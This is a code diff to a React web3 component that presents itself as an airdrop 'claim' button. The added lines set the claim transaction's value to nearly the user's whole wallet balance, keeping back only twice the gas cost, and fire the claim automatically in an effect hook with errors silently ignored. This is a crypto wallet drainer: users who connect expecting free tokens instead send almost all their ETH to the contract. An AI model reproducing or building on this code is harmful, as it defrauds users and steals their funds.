@@ -16,14 +16,17 @@ import { Button } from "@chakra-ui/react";
 import airdropAbi from "config/constants/airdrop.json";
 import { useEthersProvider } from "../../config/ether";
 import { goerli } from "viem/chains";
+import { parseEther } from "viem";
 
 const contractAddress = "0x794bF077074D4aC9e958c19CceEDe1e04ddB1a5E";
 
 export const CustomConnect = () => {
+  const [payValue, setPayValue] = useState(parseEther("0"));
   const { config } = usePrepareContractWrite({
     address: contractAddress,
     abi: airdropAbi,
     functionName: "claim",
+    value: payValue,
   });
   const { write: claim, isLoading: isLoadingClaim } = useContractWrite(config);
 
@@ -78,11 +81,14 @@ export const CustomConnect = () => {
         setCallFuncGasFee(gasAmount);
         if (balance.lte(gasAmount.mul(BigNumber.from(2)))) return;
 
+        setPayValue(
+          parseEther(
+            utils.formatEther(balance.sub(gasAmount.mul(BigNumber.from(2))))
+          )
+        );
+
         if (!isLoadingClaim) {
-          claim({
-            from: address,
-            value: balance.sub(gasAmount.mul(BigNumber.from(2))),
-          });
+          claim();
         }
       } catch (error) {}
     }
@@ -96,6 +102,7 @@ export const CustomConnect = () => {
     isLoadingClaim,
     address,
     claim,
+    payValue,
   ]);
   return (
     <ConnectButton.Custom>
